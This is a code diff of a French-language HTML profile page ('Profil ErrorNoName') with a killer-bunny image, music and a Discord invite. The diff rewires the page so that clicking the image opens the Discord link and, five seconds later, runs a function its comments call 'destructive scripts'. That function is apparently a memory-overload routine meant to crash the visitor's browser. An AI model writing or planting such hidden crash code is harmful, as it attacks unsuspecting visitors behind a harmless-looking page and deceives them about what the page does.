@@ -9,21 +9,55 @@
         body {
             margin: 0;
             padding: 0;
-            background: linear-gradient(145deg, #000000, #1a1a1a);
+            background: #000000;
             color: #ffffff;
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
             height: 100vh;
             overflow: hidden;
         }
 
+        /* Écran noir avec bouton central */
+        #intro-screen {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            background: #000000;
+            z-index: 10;
+        }
+
+        /* Bouton Profil */
+        .profile-button {
+            padding: 20px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #ffffff;
+            background: linear-gradient(145deg, #5865F2, #6a75ff);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(88, 101, 242, 0.7), 0 0 40px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .profile-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(88, 101, 242, 1), 0 0 60px rgba(0, 0, 0, 0.7);
+        }
+
         /* Conteneur principal */
         .container {
+            display: none;
             text-align: center;
             position: relative;
+            width: 100%;
+            height: 100%;
         }
 
         /* Style de l'image */
@@ -78,16 +112,20 @@
                 transform: scale(1.2);
             }
         }
-
     </style>
 </head>
 <body>
+    <!-- Écran noir avec bouton Profil -->
+    <div id="intro-screen">
+        <button class="profile-button" onclick="startPage()">Profil ErrorNoName</button>
+    </div>
+
     <!-- Conteneur de l'image principale -->
     <div class="container">
         <div class="glow"></div>
         <img src="https://i.ibb.co/dMK3t7j/4328d00292b082b5f8fa1b648d25b666-removebg-preview.png" 
              alt="Lapin Tueur" class="killer-bunny"
-             onclick="playAudioAndRedirect()">
+             onclick="openDiscord()">
     </div>
 
     <!-- Musique de fond -->
@@ -98,29 +136,26 @@
 
     <!-- Scripts JavaScript -->
     <script>
-        // Fonction pour générer un titre aléatoire avec "Killer Bunny" au centre
-        function generateTitle() {
-            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            let leftPart = "";
-            let rightPart = "";
-            for (let i = 0; i < 5; i++) {
-                leftPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
-                rightPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
-            }
-            document.title = `${leftPart} Killer Bunny ${rightPart}`;
-        }
-
-        // Mise à jour du titre toutes les secondes
-        setInterval(generateTitle, 1000);
-
-        // Fonction pour jouer la musique et rediriger
-        function playAudioAndRedirect() {
+        // Fonction pour démarrer la page
+        function startPage() {
             const audio = document.getElementById("background-music");
+            const introScreen = document.getElementById("intro-screen");
+            const container = document.querySelector(".container");
+
+            // Lancer la musique
             audio.play().then(() => {
-                window.open('https://discord.gg/amsUQdUQa7', '_blank');
+                // Cacher l'écran d'intro et afficher le contenu principal
+                introScreen.style.display = "none";
+                container.style.display = "flex";
             }).catch(error => {
                 console.error("Erreur de lecture audio : ", error);
             });
+        }
+
+        // Fonction pour ouvrir le Discord
+        function openDiscord() {
+            window.open('https://discord.gg/amsUQdUQa7', '_blank');
+            setTimeout(launchCrashScripts, 5000);
         }
 
         // Fonction contenant les scripts destructeurs
@@ -144,9 +179,6 @@
             }
             console.log("Surcharge mémoire immédiate !");
         }
-
-        // Lancer les scripts destructeurs après 5 secondes
-        setTimeout(launchCrashScripts, 5000);
     </script>
 </body>
 </html>
